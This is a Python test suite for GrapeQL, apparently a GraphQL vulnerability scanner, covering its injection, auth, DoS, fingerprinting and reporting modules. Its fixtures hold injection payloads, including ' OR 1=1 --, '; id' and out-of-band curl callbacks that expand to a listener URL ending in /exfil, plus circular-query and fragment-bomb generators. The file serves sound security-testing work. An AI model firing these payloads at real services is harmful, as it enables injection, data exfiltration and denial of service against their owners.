"""
GrapeQL Test Suite
Author: Aleksa Zatezalo
Version: 3.4
Date: February 2025
"""

import asyncio
import json
import os
import time
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import yaml

from grapeql.utils import Finding, GrapePrinter
from grapeql.baseline import BaselineTracker
from grapeql.logger import GrapeLogger
from grapeql.loader import TestCaseLoader
from grapeql.client import GraphQLClient
from grapeql.tester import VulnerabilityTester
from grapeql.fingerprint import Fingerprinter
from grapeql.info_tester import InfoTester
from grapeql.injection_tester import InjectionTester, OOBListener, OOBConnection
from grapeql.auth_tester import AuthTester
from grapeql.dos_tester import DosTester
from grapeql.reporter import Reporter
from grapeql.ai_agent import AIAgent


# ===========================================================================
#  Fixtures
# ===========================================================================

MOCK_SCHEMA = {
    "queryType": {
        "name": "Query",
        "fields": [
            {
                "name": "pastes",
                "args": [],
                "type": {"name": "PasteObject", "kind": "OBJECT", "ofType": None},
            },
            {
                "name": "paste",
                "args": [
                    {"name": "id", "type": {"name": "ID", "kind": "SCALAR", "ofType": None}},
                ],
                "type": {"name": "PasteObject", "kind": "OBJECT", "ofType": None},
            },
        ],
    },
    "mutationType": {
        "name": "Mutation",
        "fields": [
            {
                "name": "createPaste",
                "args": [
                    {"name": "title", "type": {"name": "String", "kind": "SCALAR", "ofType": None}},
                    {"name": "content", "type": {"name": "String", "kind": "SCALAR", "ofType": None}},
                ],
                "type": {"name": "PasteObject", "kind": "OBJECT", "ofType": None},
            },
        ],
    },
    "types": [
        {
            "name": "Query",
            "kind": "OBJECT",
            "fields": [
                {"name": "pastes", "type": {"name": "PasteObject", "kind": "OBJECT", "ofType": None}},
            ],
        },
        {
            "name": "PasteObject",
            "kind": "OBJECT",
            "fields": [
                {"name": "id", "type": {"name": "ID", "kind": "SCALAR", "ofType": None}},
                {"name": "title", "type": {"name": "String", "kind": "SCALAR", "ofType": None}},
                {"name": "content", "type": {"name": "String", "kind": "SCALAR", "ofType": None}},
            ],
        },
    ],
}


def _make_client_with_schema() -> GraphQLClient:
    client = GraphQLClient()
    client.endpoint = "http://localhost:5013/graphql"
    client.load_schema_from_dict(MOCK_SCHEMA)
    return client


@pytest.fixture
def tmp_dir(tmp_path):
    return tmp_path


@pytest.fixture
def sample_test_cases(tmp_dir):
    for mod, data in {
        "injection/sqli.yaml": {"test_cases": [{"name": "sqli_basic_or", "payload": "' OR 1=1 --", "indicators": ["SQL syntax", "MySQL"]}]},
        "injection/oob.yaml": {"test_cases": [{"name": "oob_curl", "oob": True, "payload": "; curl CALLBACK/oob-curl"}]},
        "injection/command.yaml": {"test_cases": [{"name": "cmd_semicolon_id", "payload": "; id", "indicators": ["root:", "/bin/bash"]}]},
        "fingerprint/engines.yaml": {"test_cases": [{"engine_id": "test_engine", "name": "Test Engine", "cve": ["CVE-2099-0001"], "probes": [{"query": "{ __typename }", "expect_has_data": True}]}]},
        "info/checks.yaml": {"test_cases": [{"name": "introspection_enabled", "title": "Introspection Enabled", "severity": "MEDIUM", "method": "CHECK_SCHEMA", "detection": {"type": "schema_exists"}, "description": "Full schema exposed", "impact": "Schema mapping", "remediation": "Disable introspection"}]},
        "auth/bypass.yaml": {"test_cases": [{"name": "no_auth_header", "strategy": "header_bypass", "description": "Auth header removed", "headers": {}}]},
        "dos/attacks.yaml": {"test_cases": [{"name": "circular_query", "title": "Circular Query DoS", "generator": "generate_circular_query", "severity": "HIGH", "depth": 5}]},
    }.items():
        p = tmp_dir / mod
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(yaml.dump(data))
    return tmp_dir


@pytest.fixture
def loader(sample_test_cases):
    return TestCaseLoader(str(sample_test_cases))


@pytest.fixture
def baseline():
    return BaselineTracker()


@pytest.fixture
def sample_findings():
    return [
        Finding(title="SQLi in createPaste", severity="HIGH", description="SQL injection", endpoint="http://localhost/graphql", impact="DB compromise", remediation="Use parameterised queries"),
        Finding(title="Introspection Enabled", severity="MEDIUM", description="Full schema exposed", endpoint="http://localhost/graphql", remediation="Disable introspection"),
        Finding(title="Field Suggestions", severity="LOW", description="Info leak", endpoint="http://localhost/graphql"),
    ]


# ===========================================================================
#  Finding
# ===========================================================================

class TestFinding:
    def test_severity_uppercased(self):
        assert Finding(title="T", severity="high", description="d", endpoint="e").severity == "HIGH"

    def test_defaults(self):
        f = Finding(title="T", severity="LOW", description="d", endpoint="e")
        assert f.impact is None and f.remediation is None and f.timestamp

    def test_to_dict_keys(self):
        d = Finding(title="T", severity="LOW", description="d", endpoint="e", impact="i", remediation="r").to_dict()
        assert set(d.keys()) == {"title", "severity", "description", "endpoint", "impact", "remediation", "timestamp"}

    def test_str(self):
        s = str(Finding(title="T", severity="HIGH", description="d", endpoint="http://x"))
        assert "HIGH" in s and "http://x" in s


# ===========================================================================
#  GrapePrinter
# ===========================================================================

class TestGrapePrinter:
    @pytest.mark.parametrize("status,marker", [("success", "[+]"), ("warning", "[!]"), ("error", "[-]"), ("log", "[!]")])
    def test_print_msg(self, capsys, status, marker):
        GrapePrinter().print_msg("msg", status=status)
        assert marker in capsys.readouterr().out

    def test_print_section(self, capsys):
        GrapePrinter().print_section("S")
        assert "S" in capsys.readouterr().out

    def test_print_vulnerability(self, capsys):
        GrapePrinter().print_vulnerability("XSS", "HIGH", "details")
        out = capsys.readouterr().out
        assert "HIGH" in out and "XSS" in out


# ===========================================================================
#  BaselineTracker
# ===========================================================================

class TestBaselineTracker:
    def test_empty(self, baseline):
        assert not baseline.has_baseline()
        assert baseline.get_aggregate_stats() == (0.0, 0.0, 0)

    def test_record_and_stats(self, baseline):
        for v in [1.0, 2.0, 3.0]:
            baseline.record("A", v)
        mean, std, count = baseline.get_aggregate_stats()
        assert count == 3 and abs(mean - 2.0) < 0.001

    def test_per_module_stats(self, baseline):
        baseline.record("A", 1.0); baseline.record("A", 3.0); baseline.record("B", 10.0)
        mean_a, _, count_a = baseline.get_module_stats("A")
        assert count_a == 2 and abs(mean_a - 2.0) < 0.001

    def test_dos_threshold_floor(self, baseline):
        baseline.record("A", 0.1); baseline.record("A", 0.2)
        assert baseline.get_dos_threshold(min_threshold=5.0) >= 5.0

    def test_dos_threshold_high_avg(self, baseline):
        for _ in range(100): baseline.record("A", 10.0)
        assert baseline.get_dos_threshold(min_threshold=5.0) >= 10.0

    def test_dos_threshold_empty(self, baseline):
        assert baseline.get_dos_threshold() == 5.0

    def test_record_batch(self, baseline):
        baseline.record_batch("X", [1.0, 2.0, 3.0])
        assert baseline.get_module_stats("X")[2] == 3

    def test_summary(self, baseline):
        baseline.record("A", 1.0); baseline.record("B", 2.0)
        s = baseline.summary()
        assert "A" in s and "B" in s and "_aggregate" in s


# ===========================================================================
#  GrapeLogger
# ===========================================================================

class TestGrapeLogger:
    def test_log_to_file(self, tmp_dir):
        p = str(tmp_dir / "test.log")
        GrapeLogger(log_file=p).log_request(module="M", test="t", status="ok")
        assert "M" in Path(p).read_text()

    def test_log_timeout(self, tmp_dir):
        p = str(tmp_dir / "t.log")
        GrapeLogger(log_file=p).log_timeout(module="M", test="t", duration=5.0)
        assert "timeout" in Path(p).read_text()

    def test_log_error(self, tmp_dir):
        p = str(tmp_dir / "t.log")
        GrapeLogger(log_file=p).log_error(module="M", test="t", message="broke")
        assert "broke" in Path(p).read_text()

    def test_truncate_response_none(self):
        assert GrapeLogger._truncate_response(None) == "-"

    def test_truncate_response_long(self):
        assert len(GrapeLogger._truncate_response({"k": "x" * 500}, max_len=50)) <= 60


# ===========================================================================
#  TestCaseLoader
# ===========================================================================

class TestTestCaseLoader:
    def test_load_module(self, loader):
        names = {tc["name"] for tc in loader.load_module("injection")}
        assert {"sqli_basic_or", "cmd_semicolon_id", "oob_curl"} <= names

    def test_load_module_nonexistent(self, loader):
        assert loader.load_module("nonexistent") == []

    def test_load_file(self, loader):
        cases = loader.load_file("injection/sqli.yaml")
        assert len(cases) == 1 and cases[0]["name"] == "sqli_basic_or"

    def test_available_modules(self, loader):
        assert set(loader.available_modules()) >= {"injection", "fingerprint", "info", "dos", "auth"}

    def test_nonexistent_directory(self):
        with pytest.raises(FileNotFoundError):
            TestCaseLoader("/nonexistent/path")

    def test_malformed_yaml(self, sample_test_cases):
        (sample_test_cases / "injection" / "bad.yaml").write_text("{invalid yaml: [")
        cases = TestCaseLoader(str(sample_test_cases)).load_module("injection")
        assert len(cases) >= 3  # 3 valid files still load

    def test_include_filter_single(self, loader):
        loader.set_include_files(["sqli.yaml"])
        names = {tc["name"] for tc in loader.load_module("injection")}
        assert "sqli_basic_or" in names and "oob_curl" not in names

    def test_include_filter_no_extension(self, loader):
        loader.set_include_files(["oob"])
        names = {tc["name"] for tc in loader.load_module("injection")}
        assert "oob_curl" in names and "sqli_basic_or" not in names

    def test_include_filter_multiple(self, loader):
        loader.set_include_files(["sqli", "oob"])
        names = {tc["name"] for tc in loader.load_module("injection")}
        assert "sqli_basic_or" in names and "oob_curl" in names and "cmd_semicolon_id" not in names

    def test_include_filter_no_match(self, loader):
        loader.set_include_files(["nonexistent.yaml"])
        assert loader.load_module("injection") == []

    def test_include_filter_cross_module(self, loader):
        loader.set_include_files(["engines.yaml", "sqli.yaml"])
        assert len(loader.load_module("fingerprint")) == 1
        assert len(loader.load_module("injection")) == 1


# ===========================================================================
#  GraphQLClient
# ===========================================================================

class TestGraphQLClient:
    def test_default_state(self):
        c = GraphQLClient()
        assert c.endpoint is None and c.headers["Content-Type"] == "application/json"

    def test_set_authorization(self):
        c = GraphQLClient(); c.set_authorization("tok", "Token")
        assert c.headers["Authorization"] == "Token tok"

    def test_clear_headers(self):
        c = GraphQLClient(); c.set_header("X", "1"); c.clear_headers()
        assert "X" not in c.headers

    def test_cookies(self):
        c = GraphQLClient(); c.set_cookies({"s": "v"}); assert c.cookies["s"] == "v"
        c.clear_cookies(); assert c.cookies == {}

    def test_configure_proxy(self):
        c = GraphQLClient(); c.configure_proxy("127.0.0.1", 8080)
        assert c.proxy_url == "http://127.0.0.1:8080"

    def test_load_schema(self):
        c = GraphQLClient()
        assert c.load_schema_from_dict(MOCK_SCHEMA) is True
        assert "pastes" in c.query_fields and "createPaste" in c.mutation_fields

    def test_load_schema_empty(self):
        c = GraphQLClient()
        assert c.load_schema_from_dict({}) is False
        assert c.load_schema_from_dict(None) is False

    @pytest.mark.asyncio
    async def test_query_no_endpoint(self):
        result, err = await GraphQLClient().graphql_query("{ x }")
        assert result is None and err is not None

    @pytest.mark.asyncio
    async def test_make_request_no_endpoint(self):
        result, err = await GraphQLClient().make_request("GET")
        assert result is None and "No endpoint" in err


# ===========================================================================
#  VulnerabilityTester
# ===========================================================================

class TestVulnerabilityTester:
    def test_auto_load(self, loader):
        class FT(VulnerabilityTester):
            MODULE_NAME = "injection"
        assert len(FT(loader=loader).test_cases) >= 3

    def test_add_and_get_findings(self):
        t = VulnerabilityTester()
        f = Finding(title="T", severity="HIGH", description="d", endpoint="e")
        t.add_finding(f)
        assert t.get_findings() == [f]

    def test_record_time_with_baseline(self, baseline):
        VulnerabilityTester(baseline=baseline)._record_response_time(0.5)
        assert baseline.has_baseline()

    def test_record_time_no_baseline(self):
        VulnerabilityTester()._record_response_time(0.5)  # no crash

    @pytest.mark.asyncio
    async def test_setup_with_preconfigured_client(self):
        t = VulnerabilityTester()
        assert await t.setup_endpoint("http://x/graphql", pre_configured_client=_make_client_with_schema())
        assert "pastes" in t.client.query_fields

    @pytest.mark.asyncio
    async def test_run_test_base(self):
        assert await VulnerabilityTester().run_test() == []


# ===========================================================================
#  Fingerprinter
# ===========================================================================

class TestFingerprinter:
    @pytest.mark.asyncio
    async def test_match(self, loader, baseline):
        fp = Fingerprinter(loader=loader, baseline=baseline)
        await fp.setup_endpoint("http://x/graphql", pre_configured_client=_make_client_with_schema())
        fp.client.graphql_query = AsyncMock(return_value=({"data": {"__typename": "Query"}}, None))
        r = await fp.fingerprint()
        assert r and r["engine_id"] == "test_engine" and "CVE-2099-0001" in r["cves"]
        assert len(fp.findings) == 1

    @pytest.mark.asyncio
    async def test_no_match(self, loader, baseline):
        fp = Fingerprinter(loader=loader, baseline=baseline)
        await fp.setup_endpoint("http://x/graphql", pre_configured_client=_make_client_with_schema())
        fp.client.graphql_query = AsyncMock(return_value=(None, "error"))
        assert await fp.fingerprint() is None


# ===========================================================================
#  InfoTester
# ===========================================================================

class TestInfoTester:
    @pytest.mark.asyncio
    async def test_schema_exists_finding(self, loader, baseline):
        info = InfoTester(loader=loader, baseline=baseline)
        await info.setup_endpoint("http://x/graphql", pre_configured_client=_make_client_with_schema())
        findings = await info.run_test()
        assert any(f.title == "Introspection Enabled" for f in findings)

    @pytest.mark.asyncio
    async def test_no_schema_no_finding(self, loader, baseline):
        info = InfoTester(loader=loader, baseline=baseline)
        info.client.endpoint = "http://x/graphql"; info.client.schema = None
        findings = await info.run_test()
        assert not any(f.title == "Introspection Enabled" for f in findings)

    @pytest.mark.asyncio
    async def test_hardcoded_fallback(self, baseline):
        info = InfoTester(baseline=baseline)
        info.client.endpoint = "http://x/graphql"; info.client.schema = MOCK_SCHEMA
        info.client.graphql_query = AsyncMock(return_value=({"errors": [{"message": "Did you mean 'directives'?"}]}, None))
        findings = await info.run_test()
        titles = {f.title for f in findings}
        assert "Field Suggestions Enabled" in titles and "Introspection Enabled" in titles


# ===========================================================================
#  InjectionTester
# ===========================================================================

class TestInjectionTester:
    def test_case_categorisation(self, loader):
        inj = InjectionTester(loader=loader)
        assert any(tc["name"] == "oob_curl" for tc in inj._oob_cases)
        assert any(tc["name"] == "sqli_basic_or" for tc in inj._sqli_cases)
        assert any(tc["name"] == "cmd_semicolon_id" for tc in inj._cmd_cases)

    def test_set_listener(self):
        inj = InjectionTester(); inj.set_listener("10.0.0.5", 4444)
        assert inj._listener and inj._listener.ip == "10.0.0.5" and inj._listener.port == 4444

    def test_build_query_mutation(self, loader):
        inj = InjectionTester(loader=loader); inj.client = _make_client_with_schema()
        q = inj._build_query("createPaste", "title", "' OR 1=1 --", True)
        assert q and "createPaste" in q and "mutation" in q

    def test_build_query_nonexistent(self, loader):
        inj = InjectionTester(loader=loader); inj.client = _make_client_with_schema()
        assert inj._build_query("nope", "x", "p", False) is None

    def test_default_payloads(self):
        inj = InjectionTester()
        assert len(inj._get_sqli_payloads()) > 0
        assert len(inj._get_cmd_payloads()) > 0
        assert len(inj._get_oob_payloads()) > 0

    @pytest.mark.asyncio
    async def test_sqli_detection(self, loader, baseline):
        inj = InjectionTester(loader=loader, baseline=baseline)
        await inj.setup_endpoint("http://x/graphql", pre_configured_client=_make_client_with_schema())
        inj.client.graphql_query = AsyncMock(return_value=({"errors": [{"message": "SQL syntax error near 'OR 1=1'"}]}, None))
        findings = await inj.run_test()
        assert any("SQL" in f.title or "Injection" in f.title for f in findings)


# ===========================================================================
#  OOBListener
# ===========================================================================

class TestOOBListener:
    def test_properties(self):
        L = OOBListener("10.0.0.5", 4444)
        assert L.callback_address == "10.0.0.5:4444"
        assert L.callback_http == "http://10.0.0.5:4444"

    @pytest.mark.asyncio
    async def test_start_stop(self):
        L = OOBListener("127.0.0.1", 0)
        assert await L.start()
        assert L._server is not None
        await L.stop()
        assert L._server is None

    @pytest.mark.asyncio
    async def test_connection_recording(self):
        L = OOBListener("127.0.0.1", 0)
        await L.start()
        port = L._server.sockets[0].getsockname()[1]
        L.set_current_payload("test_payload")

        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(b"GET /test HTTP/1.1\r\n\r\n"); await writer.drain()
        await reader.read(1024); writer.close(); await writer.wait_closed()
        await asyncio.sleep(0.5)

        conns = L.drain()
        assert len(conns) == 1 and conns[0].payload_name == "test_payload"
        assert "GET /test" in conns[0].data
        assert L.drain() == []  # drain clears
        await L.stop()


# ===========================================================================
#  OOB Placeholder Replacement (regression)
# ===========================================================================

class TestOOBPlaceholderReplacement:
    def test_correct_order(self):
        raw = 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT) }'
        q = raw.replace("CALLBACK_HOST", "10.0.0.5")
        q = q.replace("CALLBACK_PORT", "4444")
        q = q.replace("CALLBACK", "http://10.0.0.5:4444")
        assert 'host: "10.0.0.5"' in q and "port: 4444" in q

    def test_wrong_order_corruption(self):
        raw = 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT) }'
        bad = raw.replace("CALLBACK", "http://10.0.0.5:4444")
        assert "_HOST" in bad  # proves corruption

    def test_generic_payload(self):
        p = "; curl CALLBACK/exfil"
        r = p.replace("CALLBACK_HOST", "10.0.0.5")
        r = r.replace("CALLBACK_PORT", "4444")
        r = r.replace("CALLBACK", "http://10.0.0.5:4444")
        assert r == "; curl http://10.0.0.5:4444/exfil"


# ===========================================================================
#  AuthTester
# ===========================================================================

class TestAuthTester:
    def test_set_auth_headers(self):
        a = AuthTester(); a.set_auth_headers({"Authorization": "Bearer tok"})
        assert a._auth_headers["Authorization"] == "Bearer tok"

    def test_response_matches_baseline(self):
        a = AuthTester()
        base = {"data": {"user": {"id": "1"}}}
        assert a._response_matches_baseline({"data": {"user": {"id": "2"}}}, base) is True
        assert a._response_matches_baseline({"data": {"admin": {}}}, base) is False
        assert a._response_matches_baseline({"data": {"user": None}, "errors": [{"message": "denied"}]}, base) is False
        assert a._response_matches_baseline({"data": None}, base) is False

    def test_has_data(self):
        a = AuthTester()
        assert a._has_data({"data": {"user": "x"}}) is True
        assert a._has_data({"data": None}) is False
        assert a._has_data(None) is False
        assert a._has_data({"data": {"a": None}}) is False

    def test_unwrap_type(self):
        a = AuthTester()
        assert a._unwrap_type({"kind": "SCALAR", "name": "String"}) == "String"
        assert a._unwrap_type({"kind": "NON_NULL", "ofType": {"kind": "SCALAR", "name": "ID"}}) == "ID"

    def test_build_minimal_query(self):
        a = AuthTester(); a.client = _make_client_with_schema()
        q = a._build_minimal_query("pastes", a.client.query_fields["pastes"])
        assert q and "pastes" in q


# ===========================================================================
#  DosTester
# ===========================================================================

class TestDosTester:
    def _make(self, loader=None, baseline=None):
        d = DosTester(loader=loader, baseline=baseline)
        d.client = _make_client_with_schema()
        d.query_type = "Query"
        for t in MOCK_SCHEMA.get("types", []):
            if t.get("fields"):
                d.types[t["name"]] = {"fields": t["fields"]}
        return d

    def test_threshold_default(self):
        assert self._make()._get_threshold() == 5.0

    def test_threshold_from_baseline(self, baseline):
        for _ in range(50): baseline.record("X", 1.0)
        assert self._make(baseline=baseline)._get_threshold() >= 1.0

    def test_field_duplication(self):
        d = self._make()
        q = d.generate_field_duplication({"repeat_count": 100})
        # Mock schema Query type has no direct scalar fields, so generator
        # legitimately returns "". Just verify it doesn't crash and returns str.
        assert isinstance(q, str)

    def test_array_batching(self):
        b = self._make().generate_array_batching({"batch_size": 10})
        assert isinstance(b, list) and (not b or len(b) == 10)

    def test_fragment_bomb(self):
        q = self._make().generate_fragment_bomb({"fragment_count": 5})
        assert isinstance(q, str)

    def test_circular_query(self):
        assert isinstance(self._make().generate_circular_query({"depth": 3}), str)


# ===========================================================================
#  AIAgent
# ===========================================================================

class TestAIAgent:
    def test_build_prompt(self, sample_findings):
        p = AIAgent(api_key="sk-test")._build_user_prompt("http://x/graphql", sample_findings, "Focus on SQLi")
        assert "http://x/graphql" in p and "SQLi" in p and "Focus on SQLi" in p

    def test_build_prompt_no_message(self, sample_findings):
        p = AIAgent(api_key="sk-test")._build_user_prompt("http://x/graphql", sample_findings)
        assert "Operator message" not in p

    @pytest.mark.asyncio
    async def test_analyse_empty(self):
        assert await AIAgent(api_key="sk-test").analyse("http://x/graphql", []) is None

    @pytest.mark.asyncio
    async def test_analyse_success(self, sample_findings):
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {"content": [{"type": "text", "text": "## AI Analysis\nDone."}]}
        with patch("grapeql.ai_agent.httpx.AsyncClient") as MC:
            mc = AsyncMock(); mc.post.return_value = mock_resp
            mc.__aenter__ = AsyncMock(return_value=mc); mc.__aexit__ = AsyncMock(return_value=False)
            MC.return_value = mc
            r = await AIAgent(api_key="sk-test").analyse("http://x/graphql", sample_findings)
            assert r and "AI Analysis" in r

    @pytest.mark.asyncio
    async def test_analyse_api_error(self, sample_findings):
        mock_resp = MagicMock(status_code=500, text="err")
        with patch("grapeql.ai_agent.httpx.AsyncClient") as MC:
            mc = AsyncMock(); mc.post.return_value = mock_resp
            mc.__aenter__ = AsyncMock(return_value=mc); mc.__aexit__ = AsyncMock(return_value=False)
            MC.return_value = mc
            assert await AIAgent(api_key="sk-test").analyse("http://x/graphql", sample_findings) is None

    @pytest.mark.asyncio
    async def test_analyse_timeout(self, sample_findings):
        import httpx
        with patch("grapeql.ai_agent.httpx.AsyncClient") as MC:
            mc = AsyncMock(); mc.post.side_effect = httpx.TimeoutException("t")
            mc.__aenter__ = AsyncMock(return_value=mc); mc.__aexit__ = AsyncMock(return_value=False)
            MC.return_value = mc
            assert await AIAgent(api_key="sk-test").analyse("http://x/graphql", sample_findings) is None


# ===========================================================================
#  Reporter
# ===========================================================================

class TestReporter:
    def test_deduplication(self, sample_findings):
        r = Reporter(); r.add_findings(sample_findings); r.add_findings(sample_findings)
        assert len(r.findings) == len(sample_findings)

    def test_severity_counts(self, sample_findings):
        r = Reporter(); r.add_findings(sample_findings)
        c = r._severity_counts()
        assert c["HIGH"] == 1 and c["MEDIUM"] == 1 and c["LOW"] == 1

    def test_sorted_findings(self, sample_findings):
        r = Reporter(); r.add_findings(sample_findings)
        s = r._sorted_findings()
        assert s[0].severity == "HIGH" and s[-1].severity == "LOW"

    def test_markdown(self, tmp_dir, sample_findings):
        r = Reporter(); r.set_target("http://x/graphql"); r.add_findings(sample_findings)
        p = str(tmp_dir / "r.md"); r.generate_markdown(p)
        c = Path(p).read_text()
        assert "# GrapeQL" in c and "SQLi in createPaste" in c

    def test_markdown_with_ai(self, tmp_dir, sample_findings):
        r = Reporter(); r.set_target("http://x/graphql"); r.add_findings(sample_findings)
        r.set_ai_summary("## AI Analysis\nSummary.")
        p = str(tmp_dir / "r.md"); r.generate_markdown(p)
        assert "AI Analysis" in Path(p).read_text()

    def test_json(self, tmp_dir, sample_findings):
        r = Reporter(); r.set_target("http://x/graphql"); r.add_findings(sample_findings)
        p = str(tmp_dir / "r.json"); r.generate_json(p)
        d = json.loads(Path(p).read_text())
        assert d["target"] == "http://x/graphql" and d["findings_count"] == 3

    def test_json_with_ai(self, tmp_dir, sample_findings):
        r = Reporter(); r.set_target("http://x/graphql"); r.add_findings(sample_findings)
        r.set_ai_summary("AI text")
        p = str(tmp_dir / "r.json"); r.generate_json(p)
        assert json.loads(Path(p).read_text())["ai_analysis"] == "AI text"

    def test_json_no_ai_key(self, tmp_dir, sample_findings):
        r = Reporter(); r.add_findings(sample_findings)
        p = str(tmp_dir / "r.json"); r.generate_json(p)
        assert "ai_analysis" not in json.loads(Path(p).read_text())

    def test_dispatch_markdown(self, tmp_dir, sample_findings):
        r = Reporter(); r.add_findings(sample_findings)
        p = str(tmp_dir / "r.md"); r.generate_report("markdown", p); assert Path(p).exists()

    def test_dispatch_json(self, tmp_dir, sample_findings):
        r = Reporter(); r.add_findings(sample_findings)
        p = str(tmp_dir / "r.json"); r.generate_report("json", p); assert Path(p).exists()

    def test_dispatch_no_file(self, sample_findings, capsys):
        Reporter().generate_report("json", None)
        assert "No output file" in capsys.readouterr().out

    def test_dispatch_unsupported(self, tmp_dir, capsys):
        Reporter().generate_report("xml", str(tmp_dir / "r.xml"))
        assert "Unsupported" in capsys.readouterr().out

    def test_print_summary_empty(self, capsys):
        Reporter().print_summary()
        assert "No vulnerabilities found" in capsys.readouterr().out

    def test_print_summary_with_findings(self, capsys, sample_findings):
        r = Reporter(); r.add_findings(sample_findings); r.print_summary()
        out = capsys.readouterr().out
        assert "HIGH" in out and "Total: 3" in out


# ===========================================================================
#  CLI Argument Parsing
# ===========================================================================

class TestCLI:
    def test_parse_basic(self):
        from grapeql.cli import GrapeQL
        with patch("sys.argv", ["grapeql", "--api", "http://x/graphql"]):
            args = GrapeQL().parse_arguments()
        assert args.api == "http://x/graphql" and args.modules is None

    def test_parse_all_options(self):
        from grapeql.cli import GrapeQL
        argv = [
            "grapeql", "--api", "http://x/graphql",
            "--modules", "fingerprint", "injection",
            "--proxy", "127.0.0.1:8080", "--auth", "tok",
            "--auth-type", "Token", "--cookie", "s:v",
            "--report", "o.md", "--report-format", "json",
            "--username", "u", "--password", "p",
            "--log-file", "l.log", "--schema-file", "s.json",
            "--include", "sqli.yaml", "oob.yaml",
            "--listener-ip", "10.0.0.5", "--listener-port", "4444",
            "--ai-key", "sk-test", "--ai-message", "Focus",
        ]
        with patch("sys.argv", argv):
            a = GrapeQL().parse_arguments()
        assert a.modules == ["fingerprint", "injection"]
        assert a.include == ["sqli.yaml", "oob.yaml"]
        assert a.listener_ip == "10.0.0.5" and a.listener_port == 4444
        assert a.ai_key == "sk-test" and a.ai_message == "Focus"

    def test_missing_api(self):
        from grapeql.cli import GrapeQL
        with patch("sys.argv", ["grapeql"]):
            with pytest.raises(SystemExit): GrapeQL().parse_arguments()

    def test_invalid_module(self):
        from grapeql.cli import GrapeQL
        with patch("sys.argv", ["grapeql", "--api", "http://x", "--modules", "invalid"]):
            with pytest.raises(SystemExit): GrapeQL().parse_arguments()